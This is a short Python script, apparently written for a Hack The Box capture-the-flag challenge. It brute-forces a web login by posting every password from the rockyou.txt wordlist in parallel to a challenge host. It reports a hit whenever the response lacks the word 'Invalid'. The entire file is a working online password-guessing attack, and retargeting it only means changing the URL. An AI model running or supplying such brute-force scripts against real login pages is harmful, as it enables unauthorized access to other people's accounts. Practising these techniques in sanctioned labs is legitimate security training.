import multiprocessing
import requests
import time
from contextlib import suppress
import sys

#open the wordlist, encoded correctly, and split into an array
wl = open("rockyou.txt", encoding='latin-1').read().splitlines()

def testpw(word):
    try:
        url = "http://docker.hackthebox.eu:53052/"
        payload = {'password':word}
        r = requests.post(url, data=payload)
        res = r.text

        if "Invalid" not in res:
            print("password is " + word)

    except:
        res = ""

def main():
    p = multiprocessing.Pool(15)
    p.map(testpw, wl)

if __name__ == "__main__":
    main()
